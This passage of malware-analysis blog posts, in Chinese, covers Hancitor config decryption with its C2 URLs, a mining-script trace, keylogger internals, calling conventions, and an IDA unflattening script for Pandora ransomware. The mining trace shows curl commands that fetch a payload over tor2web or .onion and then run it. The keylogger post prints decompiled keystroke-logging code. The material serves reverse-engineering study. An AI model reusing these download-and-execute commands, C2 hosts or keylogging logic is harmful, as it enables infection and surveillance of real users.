0x50, 0x11, 0x23, 0xAD, 0x61, 0x37, 0x94, 0x20, 0x14, 0x5E, 0x9B, 0xAD, 0x09, 0xED, 0x87, 0x4E, 0x68, 0xB7, 0x82, 0x4D, 0x20, 0x03, 0x4C, 0xB7, 0x38, 0xEB, 0x63, 0xA7, 0xB0, 0x1A, 0xD8, 0xAB, 0xD2, 0x03, 0x3A, 0xAF, 0xD9, 0x13, 0xB4, 0xA5, 0xDE, 0xAF, 0xAD, 0x1B, 0x3F, 0xB6, 0x07, 0xAE, 0x19, 0x32, 0xE2, 0x3D, 0x8E, 0x0C, 0xD8, 0x73, 0xB8, 0x8B, 0x4D, 0x1F, 0x2C, 0x2D, 0x78, 0xBC, 0xA8, 0x40, 0x0B, 0xB9, 0x0F, 0x34, 0x3C, 0x33, 0x2E, 0xD7, 0x44, 0x29, 0xDC, 0x19, 0xC8, 0x0D, 0xE4, 0xC1, 0x3C, 0x83, 0xF4, 0x8F, 0xA4, 0xA9, 0xFF, 0xB2, 0xD5, 0xF2, 0x3B, 0xD8, 0x9D, 0xCB, 0x9F, 0x07, 0xAC, 0xAE, 0x80, 0x38, 0x4F, 0xF6, 0x2A, 0x4C, 0x12, 0x4A, 0xF5, 0xA7, 0xFD, 0xC2, 0x55, 0xB2, 0xAD, 0x38, 0x66, 0x24, 0x80, 0xCE, 0x66, 0x0B, 0x2A, 0x02, 0x97, 0x90, 0x03, 0x0C, 0xA0, 0xB9]m = hashlib.sha1()m.update(pbdata)rc4_key = m.digest()[:5]rc4 = ARC4.new(rc4_key)config = rc4.decrypt(bytearray(enc))print(config)BUILD ID: b'0109_iqwnm'C2: b'http://asinvotheir.com/8/forum.php'C2: b'http://ditrismale.ru/8/forum.php'C2: b'http://clatrommon.ru/8/forum.php' send在获得了主机配置后，通过post方式发送到远程主机 获得返回值 1YJQBARZAEg4OCkBVVRcbD0kPVAgPVUpISkNUGBMUBwEWQBIODgpAVVUXGw9JD1QID1VKSEpDCVQYExQH 通过exe的解密和校验方式可知忽略前四个字节并和122进行异或。 那么可以明白，我们访问了http://asinvotheir.com/8/forum.php后，但是我们还不知道这个文件的作用。 我们只知道在此之后它访问了http://107.167.2.123/xN1e 我们回到dll文件中分析 在sub_5B2230函数中，发送了get请求获取到了0209.bin文件，绕后通过check_bin函数进行文件的校验。然后利用decrypt_bin函数进行解密 函数流程 decrypt_bin函数 12345678910111213141516171819ULONG __cdecl decrypt_bin(int a1, int a2, ULONG UncompressedBufferSize){ ULONG FinalUncompressedSize; // [esp+0h] [ebp-10h] BYREF NTSTATUS v5; // [esp+4h] [ebp-Ch] PUCHAR UncompressedBuffer; // [esp+8h] [ebp-8h] unsigned int i; // [esp+Ch] [ebp-4h] UncompressedBuffer = sub_5B1390(UncompressedBufferSize); for ( i = 8; i &lt; a2; ++i ) *(i + a1) ^= *(a1 + i % 8); v5 = RtlDecompressBuffer(2u, UncompressedBuffer, UncompressedBufferSize, (a1 + 8), a2 - 8, &amp;FinalUncompressedSize); if ( !v5 ) sub_5B1450(a1, UncompressedBuffer, FinalUncompressedSize); sub_5B13D0(UncompressedBuffer); if ( v5 ) return 0; else return FinalUncompressedSize;} 解密函数 1234567891011import lznt1data = bytearray(open('0209.bin','rb').read())for i in range(8,len(data)): data[i] ^= data[i%8]outs = lznt1.decompress(data[8:])outfile = open('out.bin','wb')outfile.write(outs)outfile.close() 得到了ua头和1个ip地址，但是可疑的是我们的MZ头并没有出现，但是ip和ua头已经正常了，这里先放一下。 那么很明显这部分shellcode的作用就是访问了http://107.167.2.123/xN1e 流量部分一开始访问了feedproxy.google.com/~r/ndfbytcix/~3/FsOlK8-2g6M/arrest.php 由于中间有非常多的加密流，我们这里先过滤出url 1http or tls.handshake.type ==1 apiipify.org查询自身ip，找到公网ip便于后续连接 感染流量 远控主机ip地址为107.167.2.123 参考链接Hancitor Continues to Push Cobalt Strike (thedfirreport.com)","link":"/2022/03/23/2021-09-02%20(THURSDAY)%20-%20HANCITOR%20(CHANITORMAN1MOSKALVZAPOETA511)%20WITH%20COBALT%20STRIKE%20(BEACON)/"},{"title":"ror-hash","text":"ror-hash一个常用于加密导入函数的简单算法 123456789&gt;&gt;&gt; a = 'virtualallocexnuma'.upper() &gt;&gt;&gt; a 'VIRTUALALLOCEXNUMA' &gt;&gt;&gt; h = 0 &gt;&gt;&gt; for c in a: ... h = ror(h, 13) ... h += ord(c) ...&gt;&gt;&gt; h 383669855 如下图就是一个ror-13 hash算法得到的，因此恶意代码分析者无法轻易得知这是加载了哪一个函数。","link":"/2022/03/23/ror-hash/"},{"title":"mining-sh-analysis","text":"mining Virus Analysis md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6 Analysisstep1sh文件，简单易懂的base64混淆 解密后得到脚本step-2 step2 exec &amp;&gt;/dev/null不允许输出 export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin设置环境变量 ```┌──(kali㉿kali)-[~]└─$ grep x:$(id -u): /etc/passwd|cut -d: -f6/home/kali 1234567891011121314151617181920214. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200` `-4`(`--ipv4` Resolve names to IPv4 addresses) `--fail`,`--silent`,`--show-error`(Show error even when -s is used), `-L`(`--location` follow the direction) `-k`(`--insecure` Allow insecure server connections), `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server) `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。暴力解决sh，我们得到如下执行顺序 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin ++ cut -d: -f6+++ id -u++ grep x:1000: /etc/passwd d=/home/kali ++ echo ‘curl -4fsSLkA- -m200’ c=’curl -4fsSLkA- -m200’ ++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad t=5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01head: cannot open ‘/tmp/.X11-unix/01’ for reading: No such file or directory ls /proc//statusls: cannot access ‘/proc//status’: No such file or directory fexe for i in . $HOME /usr/bin $d /var/tmp echo exit chmod +x ./i cd . ./i break u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in sockz n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch) ++ echo ‘dns-query?name=relay.tor2socks.in’ p=’dns-query?name=relay.tor2socks.in’ ++ grep -oE ‘\\b([0-9]{1,3}.){3}[0-9]{1,3}\\b’++ curl -4fsSLkA- -m200 ‘https://doh.li/dns-query?name=relay.tor2socks.in'++ grep -Ev ‘[.]0’++ tr ‘ ‘ ‘\\n’++ sort -uR++ head -n 1curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 s= ++ uname -m f=/int.x86_64 ++ date++ md5sum++ cut -f1 -d- x=’./90aab6fe6a62477d35a888699d973c67 ‘ ++ curl -4fsSLk checkip.amazonaws.com++ whoami++ uname -m++ uname -n++ ip a++ grep ‘inet ‘++ awk ‘{print $2}’++ awk ‘{print $1}’++ md5sum++ base64 -w0++ crontab -lno crontab for kali r=xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ curl -4fsSLkA- -m200 -x socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_curl: (5) Unsupported proxy syntax in ‘socks5h://:9050’ curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ echo .socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_.socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ chmod +x ./90aab6fe6a62477d35a888699d973c67 ./90aab6fe6a62477d35a888699d973c67 ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status break``` 部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。","link":"/2022/03/29/mining-sh-analysis/"},{"title":"keylog","text":"样本来源：lab03-03 md5: e2bf42217a67e46433da8b6f4507219e 动态解密资源里的PE后得到了keylog的代码部分。这里不写。 keylog Analysis通过伪代码我可以很清楚得看到keylog的几步 FindWindowA ShowWindow GetModuleHandleA SetWindowHookExA unhookWindowsHookEx 而其中最重要的就是SetWindowHookExA和UnhookWindowsHookEx两个函数了 这里需要注意，如果要下dll断点时，我们的断点应该打在user32.dll. SetWindowsHookExA123456HHOOK SetWindowsHookExA( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId); idhook1[in] idHook Type: int The type of hook procedure to be installed. This parameter can be one of the following values. Value Meaning WH_CALLWNDPROC 4 Installs a hook procedure that monitors messages before the system sends them to the destination window procedure. For more information, see the CallWndProc hook procedure. WH_CALLWNDPROCRET 12 Installs a hook procedure that monitors messages after they have been processed by the destination window procedure. For more information, see the CallWndRetProc hook procedure. WH_CBT 5 Installs a hook procedure that receives notifications useful to a CBT application. For more information, see the CBTProc hook procedure. WH_DEBUG 9 Installs a hook procedure useful for debugging other hook procedures. For more information, see the DebugProc hook procedure. WH_FOREGROUNDIDLE 11 Installs a hook procedure that will be called when the application’s foreground thread is about to become idle. This hook is useful for performing low priority tasks during idle time. For more information, see the ForegroundIdleProc hook procedure. WH_GETMESSAGE 3 Installs a hook procedure that monitors messages posted to a message queue. For more information, see the GetMsgProc hook procedure. WH_JOURNALPLAYBACK 1 Installs a hook procedure that posts messages previously recorded by a WH_JOURNALRECORD hook procedure. For more information, see the JournalPlaybackProc hook procedure. WH_JOURNALRECORD 0 Installs a hook procedure that records input messages posted to the system message queue. This hook is useful for recording macros. For more information, see the JournalRecordProc hook procedure. WH_KEYBOARD 2 Installs a hook procedure that monitors keystroke messages. For more information, see the KeyboardProc hook procedure. WH_KEYBOARD_LL 13 Installs a hook procedure that monitors low-level keyboard input events. For more information, see the LowLevelKeyboardProc hook procedure. WH_MOUSE 7 Installs a hook procedure that monitors mouse messages. For more information, see the MouseProc hook procedure. WH_MOUSE_LL 14 Installs a hook procedure that monitors low-level mouse input events. For more information, see the LowLevelMouseProc hook procedure. WH_MSGFILTER -1 Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. For more information, see the MessageProc hook procedure. WH_SHELL 10 Installs a hook procedure that receives notifications useful to shell applications. For more information, see the ShellProc hook procedure. WH_SYSMSGFILTER 6 Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. The hook procedure monitors these messages for all applications in the same desktop as the calling thread. For more information, see the SysMsgProc hook procedure. 这里是WH_KEYBOARD_LL 13，也就是Installs a hook procedure that monitors low-level keyboard input events. For more information, see the [LowLevelKeyboardProc](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)) hook procedure. lpfn A pointer to the hook procedure. If the dwThreadId parameter is zero or specifies the identifier of a thread created by a different process, the lpfn parameter must point to a hook procedure in a DLL. Otherwise, lpfn can point to a hook procedure in the code associated with the current process. lpfn传的是hook的函数 它对回调函数LowLevelKeyboardProc进行了hook sub_4010C7函数存的是对键盘码的处理,这里是写入到了practicalmalwareanalysis.log文件中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990if ( result != -1 ) { SetFilePointer(result, 0, 0, 2u); ForegroundWindow = GetForegroundWindow(); GetWindowTextA(ForegroundWindow, Str2, 1024); if ( strcmp(Str1, Str2) ) { WriteFile(hFile, aWindow, 0xCu, &amp;NumberOfBytesWritten, 0); v3 = strlen(Str2); WriteFile(hFile, Str2, v3, &amp;NumberOfBytesWritten, 0); WriteFile(hFile, asc_40503C, 4u, &amp;NumberOfBytesWritten, 0); strncpy(Str1, Str2, 0x3FFu); byte_40574F = 0; } if ( Buffer &lt; 39 || Buffer &gt; 64 ) { if ( Buffer &lt;= 64 || Buffer &gt;= 91 ) { switch ( Buffer ) { case 8u: v4 = strlen(aBackspace); WriteFile(hFile, aBackspace_0, v4, &amp;NumberOfBytesWritten, 0); break; case 9u: WriteFile(hFile, aTab, 5u, &amp;NumberOfBytesWritten, 0); break; case 0xDu: WriteFile(hFile, aEnter, 8u, &amp;NumberOfBytesWritten, 0); break; case 0x10u: WriteFile(hFile, aShift, 7u, &amp;NumberOfBytesWritten, 0); break; case 0x11u: WriteFile(hFile, aCtrl, 6u, &amp;NumberOfBytesWritten, 0); break; case 0x14u: v5 = strlen(aCapsLock); WriteFile(hFile, aCapsLock_0, v5, &amp;NumberOfBytesWritten, 0); break; case 0x20u: WriteFile(hFile, asc_405074, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x2Eu: WriteFile(hFile, aDel, 5u, &amp;NumberOfBytesWritten, 0); break; case 0x60u: WriteFile(hFile, a0, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x61u: WriteFile(hFile, a1, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x62u: WriteFile(hFile, a2, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x63u: WriteFile(hFile, a3, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x64u: WriteFile(hFile, a4, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x65u: WriteFile(hFile, a5, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x66u: WriteFile(hFile, a6, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x67u: WriteFile(hFile, a7, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x68u: WriteFile(hFile, a8, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x69u: WriteFile(hFile, a9, 1u, &amp;NumberOfBytesWritten, 0); break; default: return CloseHandle(hFile); } } else { Buffer += 32; WriteFile(hFile, &amp;Buffer, 1u, &amp;NumberOfBytesWritten, 0); } } else { WriteFile(hFile, &amp;Buffer, 1u, &amp;NumberOfBytesWritten, 0); }","link":"/2022/04/01/keylog/"},{"title":"oep_tricks","text":"OEP tricksintroWhy is the PE Entry Point Not the same as Main Understanding __security__init__cookieandscrt_common_main_seh 在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为boilerplate代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。 MSVC console Application Entry pointThe Entry Point on an MSVC console application servers two purples . calls the __security__init_cookie function jumps to the __scrt_common_main_sehthunk The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls main. __security_init_cookie The purpose of this cookie is best described by MSDN 全局安全 cookie 用于在使用 /GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。 在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。 Normally, __security_init_cookie is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use /ENTRY to specify an entry-point—then you must call __security_init_cookie yourself. If __security_init_cookie isn’t called, the global security cookie is set to a default value and buffer overrun protection is compromised. Because an attacker can exploit this default cookie value to defeat the buffer overrun checks, we recommend that you always call __security_init_cookie when you define your own entry point. we can use the opcode 48 89 5C 24 20 55 48 8B EC 48 83 EC 20 to find the __security_init_cookie The call to __security_init_cookie must be made before any overrun-protected function is entered; otherwise a spurious buffer overrun will be detected. For more information, see C Runtime Error R6035. __scrt_common_main_sehLooking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype. *main(int argc, const char **argv, const char *envp) This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: argc, argv, envp. In 64-bit binaries these arguments are compiled into a series of three mov instructions moving the arguments into the registers RCX, RDX, R8 1234C 8B C7 mov r8, rdi ; envp48 8B D3 mov rdx, rbx ; argv8B 08 mov ecx, [rax] ; argc In 32-bit binaries these arguments are compiled into a series of three push instructions pushing the arguments onto the stack. ！！！！！！These patterns can be relied on to identify main. ！！！！！！！","link":"/2022/04/04/oep-tricks/"},{"title":"calling-convention","text":"Calling ConventionsThere are different calling conventions for different operating systems or different bits of systemor you compile with the vs (or others) Different conventions based on processor,OS,and Language Describe how are passed to functions Describe how are returned from functions Describe if the caller or callee clean the stack Resonsible for function andprologueandepilogue Windows x86 Calling Convention Keyword Stack cleanup Parameter passing __cdecl Caller Pushes parameters on the stack, in reverse order (right to left) __clrcall n/a Load parameters onto CLR expression stack in order (left to right). __stdcall Callee Pushes parameters on the stack, in reverse order (right to left) __fastcall Callee Stored in registers, then pushed on stack __thiscall Callee Pushed on stack; this pointer stored in ECX __vectorcall Callee Stored in registers, then pushed on stack in reverse order (right to left) All arguments are widened to 32 bits(DWORD) Return value is widened to 32 bits(DWORD) Return values up to 32 bits are returned to eax register Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register) Return Structures are returned by reference with a pointer in EAX Registers ESI,EDI,EBX,and EBP are restored(non-volatile) MSDN is your friend __cdecl Default calling convention for c and c++ Arguments are passed on the stack(pushed right-to-left) Called is responsible for stack cleanup will (cdecl will clean the stack ) this is important when there are variadic functions,so function doesn’t worry about stack cleaning. Supports varag(variadic)functions Example code below: then we can get follow code with ida sub_401090 is the hello1 function sub_401000 is the addingNumberVariadic function which is variadic notice that caller clean the stack when the function return __stdcallThe __stdcall calling convention is used to call Win32 API functions. The callee cleans the stack, so the compiler makes vararg functions __cdecl. Functions that use this calling convention require a function prototype. The __stdcall modifier is Microsoft-specific. Element Implementation Argument-passing order Right to left. Argument-passing convention By value, unless a pointer or reference type is passed. Stack-maintenance responsibility Called function pops its own arguments from the stack. Name-decoration convention An underscore (_) is prefixed to the name. The name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as int func( int a, double b ) is decorated as follows: _func@12 __fastcallThe __fastcall calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention. Element Implementation Argument-passing order The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left. Stack-maintenance responsibility Called function pops the arguments from the stack. Name-decoration convention At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names. Case-translation convention No case translation performed. __thiscallThe Microsoft-specific __thiscall calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (vararg functions). Under __thiscall, the callee cleans the stack, which is impossible for vararg functions. Arguments are pushed on the stack from right to left. The this pointer is passed via register ECX, and not on the stack. vararg member functions use the __cdecl calling convention. All function arguments are pushed on the stack, with the this pointer placed on the stack last. Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme. When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition. __vectorcallThe __vectorcall calling convention specifies that arguments to functions are to be passed in registers. __vectorcall uses more registers for arguments than __fastcall or the default x64 calling convention(rcx rdx r7 r8 [rsp+[size of arg]) use. The __vectorcall calling convention is only supported in native code on x86 and x64 processors that include Streaming SIMD Extensions 2 (SSE2) and above. Use __vectorcall to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of __vectorcall. The differences are explained later in this article. to be continue one day Reference: https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170","link":"/2022/04/07/calling-convention/"},{"title":"Pandora-Ransomeware-fla-unpack","text":"Pandora Ransomware[TOC] overviewFirst of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however. Sample: 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b Unpacked sample: 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 on the malshare(by the oalabs) References Control Flow Flattening Deobfuscation - Recovering an ollvm dumpulator Control Flow Unflattening malshare oalabs Dumpulator according to the jmp [register] Our approach is to seperate the dispatcher bb from the payload bb. For each dispatcher bb the code is emulated with all conditions to generate the conditional jump addresses. The bb is then replaced with a simple compare and conditional jmp. Emulation is done with Dumpulator. Once the dispatcher has been deobfuscated we should be able to see the control flow for the payload bb, and futher simplify the dispatcher using more traditional tools, possibly removing it completely. if the jump is relative it’s for a code bb if the jump is register then it’s a cf bb if there is a ret this is the end build a table of bb the start is next head after jmp, end is jmp emulate patch the jmp for each table entry IDA Produce Basic Block TableThere are two dispatcher bb formats, one that uses cmovl, cmovz, and one that uses setl and setz. We need to match both patterns and determine the type of condition for our jmp statement, and the eax cmp value. For each bb record the following information so it can be used in our emulator. bb start bb end add cmov instruction type of cmov instruction (l,z) eax cmp value jmp register Results: (bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105# Basic blocks for dispatcherbb_table = []# List of addresses of original code basic blocksbb_orig_table = []ptr = 0x00007FF6654A67F0end = 0x00007FF6654A70D0bb_start = ptrwhile ptr &lt;= end: if print_insn_mnem(ptr) == 'jmp': op_type = idc.get_operand_type(ptr, 0) if op_type == o_reg: # This is a cf bb save it reg_name = print_operand(ptr, 0) # Get eax value first_instruction = print_insn_mnem(bb_start) if first_instruction == 'cmp': eax_cmp_value = get_operand_value(bb_start,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if 'cmovl' == print_insn_mnem(bb_ptr): jmp_condition = 'cmovl' break elif 'cmovz' == print_insn_mnem(bb_ptr): jmp_condition = 'cmovz' break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain cmovl or cmovz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue elif first_instruction == 'xor': # assume next instruction is the cmp, we should check ptr_cmp = next_head(bb_start) if &quot;cmp&quot; != print_insn_mnem(ptr_cmp): # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain have cmp after xor, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue eax_cmp_value = get_operand_value(ptr_cmp,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if 'setl' == print_insn_mnem(bb_ptr): jmp_condition = 'setl' break elif 'setz' == print_insn_mnem(bb_ptr): jmp_condition = 'setz' break elif 'setnz' == print_insn_mnem(bb_ptr): jmp_condition = 'setnz' break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain setl or setz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue else: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't match pattern, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue print(f&quot;Dispatcher bb {hex(bb_start)}&quot;) bb_table.append((bb_start,ptr,eax_cmp_value,jmp_condition,jmp_condition_address,reg_name)) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: # This is code bb don't save it print(f&quot;Original code bb {hex(bb_start)}&quot;) bb_orig_table.append(bb_start) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: ptr = next_head(ptr)bb_orig_table = [0x7ff6654a687f, 0x7ff6654a691a, 0x7ff6654a6a04, 0x7ff6654a6a84, 0x7ff6654a6ad1, 0x7ff6654a6b3b, 0x7ff6654a6b9b, 0x7ff6654a6bf3, 0x7ff6654a6c61, 0x7ff6654a6cfd, 0x7ff6654a6e9f, 0x7ff6654a6ef8, 0x7ff6654a6f58, 0x7ff6654a7024]bb_table = [(0x7ff6654a67f0, 0x7ff6654a6817, 0x10bc6c78, 'cmovl', 0x7ff6654a67fa, 'rdx'), (0x7ff6654a6819, 0x7ff6654a682e, 0xffffffffc30bae2e, 'cmovl', 0x7ff6654a6823, 'rdx'), (0x7ff6654a6830, 0x7ff6654a6845, 0xffffffffa2992627, 'cmovl', 0x7ff6654a683a, 'rdx'), (0x7ff6654a6847, 0x7ff6654a6861, 0xffffffffa22a16af, 'cmovl', 0x7ff6654a6856, 'rdx'), (0x7ff6654a6863, 0x7ff6654a687d, 0xffffffff8cbc0434, 'cmovz', 0x7ff6654a6872, 'rcx'), (0x7ff6654a68b0, 0x7ff6654a68c5, 0x6c249751, 'cmovl', 0x7ff6654a68ba, 'rdx'), (0x7ff6654a68c7, 0x7ff6654a68e1, 0x3b2b8a1e, 'cmovl', 0x7ff6654a68d6, 'rdx'), (0x7ff6654a68e3, 0x7ff6654a68fd, 0x173ba5e1, 'cmovl', 0x7ff6654a68f2, 'rdx'), (0x7ff6654a68ff, 0x7ff6654a6918, 0x10bc6c78, 'setz', 0x7ff6654a6906, 'rcx'), (0x7ff6654a69b0, 0x7ff6654a69ca, 0xffffffffd43fb344, 'cmovl', 0x7ff6654a69bf, 'rdx'), (0x7ff6654a69cc, 0x7ff6654a69e6, 0xffffffffcef7092e, 'cmovl', 0x7ff6654a69db, 'rdx'), (0x7ff6654a69e8, 0x7ff6654a6a02, 0xffffffffc30bae2e, 'cmovz', 0x7ff6654a69f7, 'rcx'), (0x7ff6654a6a30, 0x7ff6654a6a4a, 0x7d71a1e3, 'cmovl', 0x7ff6654a6a3f, 'rdx'), (0x7ff6654a6a4c, 0x7ff6654a6a66, 0x7a980236, 'cmovl', 0x7ff6654a6a5b, 'rdx'), (0x7ff6654a6a68, 0x7ff6654a6a82, 0x6c249751, 'cmovz', 0x7ff6654a6a77, 'rcx'), (0x7ff6654a6a99, 0x7ff6654a6ab3, 0xffffffffc094d6c9, 'cmovl', 0x7ff6654a6aa8, 'rdx'), (0x7ff6654a6ab5, 0x7ff6654a6acf, 0xffffffffa2992627, 'cmovz', 0x7ff6654a6ac4, 'rcx'), (0x7ff6654a6b09, 0x7ff6654a6b1e, 0x3cd69d30, 'setl', 0x7ff6654a6b10, 'rdx'), (0x7ff6654a6b20, 0x7ff6654a6b39, 0x3b2b8a1e, 'setnz', 0x7ff6654a6b27, 'rcx'), (0x7ff6654a6b63, 0x7ff6654a6b7d, 0xffffffffecce8ff1, 'cmovl', 0x7ff6654a6b72, 'rdx'), (0x7ff6654a6b7f, 0x7ff6654a6b99, 0xffffffffd43fb344, 'cmovz', 0x7ff6654a6b8e, 'rcx'), (0x7ff6654a6bbb, 0x7ff6654a6bd5, 0x7d9d86f3, 'cmovl', 0x7ff6654a6bca, 'rdx'), (0x7ff6654a6bd7, 0x7ff6654a6bf1, 0x7d71a1e3, 'cmovz', 0x7ff6654a6be6, 'rcx'), (0x7ff6654a6c45, 0x7ff6654a6c5f, 0xffffffffa22a16af, 'cmovz', 0x7ff6654a6c54, 'rcx'), (0x7ff6654a6ce1, 0x7ff6654a6cfb, 0x173ba5e1, 'cmovz', 0x7ff6654a6cf0, 'rcx'), (0x7ff6654a6e83, 0x7ff6654a6e9d, 0xffffffffcef7092e, 'cmovz', 0x7ff6654a6e92, 'rcx'), (0x7ff6654a6edc, 0x7ff6654a6ef6, 0x7a980236, 'cmovz', 0x7ff6654a6eeb, 'rcx'), (0x7ff6654a6f3d, 0x7ff6654a6f56, 0xffffffffc094d6c9, 'setz', 